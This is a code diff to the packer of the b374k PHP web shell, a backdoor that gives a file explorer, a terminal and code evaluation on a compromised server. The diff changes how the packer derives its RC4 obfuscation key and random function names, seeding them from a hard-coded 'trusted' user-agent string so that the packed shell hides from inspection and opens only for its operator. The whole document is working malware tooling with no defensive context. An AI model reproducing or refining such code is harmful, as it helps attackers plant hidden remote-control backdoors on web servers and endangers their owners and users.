@@ -21,7 +21,6 @@ $GLOBALS['packer']['resources_dir'] = "./resources/";
 
 $TRUST_USER_AGENT = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/64.0.3282.112 Mobile/15D60 Safari/604.1";
 $debug_rc4_key = generateRandomString(32, $TRUST_USER_AGENT);
-srand(time());
 $supported_network_rs_types = array('executable', 'gcc', 'java', 'php', 'python');
 
 require $GLOBALS['packer']['base_dir'].'jsPacker.php';
@@ -125,9 +124,6 @@ if(isset($_SERVER['REMOTE_ADDR'])){
             $seed = $p['user_agent'];
         }
         $GLOBALS['cipher_key'] = generateRandomString(32, $seed);
-        if ($seed) {
-            srand(time());
-        }
 
 		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);
 
@@ -655,7 +651,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
     }
     $bds = '_'.generateRandomString(2);
     $cs = '_'.generateRandomString(2);
-	$rc4_function = $compress=="rc4" ? 'function rc4($a,$b){if(!$a){return 0;}$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}function '.$bds.'($s){$r='.'bzdecompress($s);if(gettype($r)=="integer"){phpinfo();return "";}else{return $r;}}function '.$cs.'($s){srand(crc32(trim($s)));$cs="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";$cl=strlen($cs)-1;$s="";for($i=0;$i<32;$i++){$s.=$cs[rand(0,$cl)];}srand(time());return $s;}':'';
+	$rc4_function = $compress=="rc4" ? 'function rc4($a,$b){if(!$a){return 0;}$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}function '.$bds.'($s){$r='.'bzdecompress($s);if(gettype($r)=="integer"){phpinfo();return "";}else{return $r;}}function '.$cs.'($s){$m=md5($s,true).md5(sha1($s),true);$cs="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";$cl=strlen($cs);$s="";for($i=0;$i<32;$i++){$s.=$cs[(ord($m[$i])&0xff)%$cl];}return $s;}':'';
 
 	if($strip=='yes'){
 		$phpcode = packer_strips($phpcode);
@@ -719,14 +715,19 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 }
 
 function generateRandomString($length = 10, $seed = null) {
+    $hash = null;
     if ($seed) {
-        srand(crc32(trim($seed)));
+        $hash = md5($seed, true) . md5(sha1($seed), true);
     }
     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
     $charactersLength = strlen($characters);
     $randomString = '';
     for ($i = 0; $i < $length; $i++) {
-        $randomString .= $characters[rand(0, $charactersLength - 1)];
+        if($hash) {
+            $randomString .= $characters[(ord($hash[$i%32]) & 0xff) % $charactersLength];
+        } else {
+            $randomString .= $characters[rand(0, $charactersLength - 1)];
+        }
     }
     return $randomString;
 }
